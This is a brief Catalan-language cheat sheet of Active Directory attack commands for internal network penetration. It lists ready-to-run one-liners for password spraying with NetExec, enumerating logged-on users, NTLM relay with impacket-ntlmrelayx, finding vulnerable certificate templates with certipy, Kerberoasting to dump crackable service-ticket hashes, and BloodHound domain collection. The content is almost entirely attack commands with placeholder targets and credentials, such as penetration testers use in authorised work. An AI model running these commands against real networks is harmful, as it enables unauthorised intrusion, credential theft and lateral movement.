# 🔐 Active Directory & Internal Exploitation

Fluxos de treball i comandes per a entorns Windows i moviment lateral.

## 🔍 Enumeració i Accés Inicial
- **Password Spraying (NetExec):**
  `nxc smb 10.0.0.0/24 -u users.txt -p 'Pass123!' --continue-on-success`
- **Trobar sessions d'usuaris loguejats:**
  `nxc smb 10.0.0.0/24 -u 'user' -p 'pass' --loggedon-users`

## 🚀 Moviment Lateral i Atacs
- **SMB Relay Attack (Impacket):**
  `impacket-ntlmrelayx -tf targets.txt -smb2support -socks`
- **AD CS Abuse (Certificats):**
  `certipy find -u 'user@domain.local' -p 'password' -dc-ip 10.10.10.1 -vulnerable -stdout`
- **Kerberoasting:**
  `impacket-GetUserSPNs -dc-ip 10.10.10.1 domain.local/user:password -request -outputfile hashes.kerberoast`

## 📊 Recollida de Dades
- **BloodHound (SharpHound):**
  `python3 bloodhound.py -u 'user' -p 'password' -d 'domain.local' -dc 'dc01.domain.local' -c All`
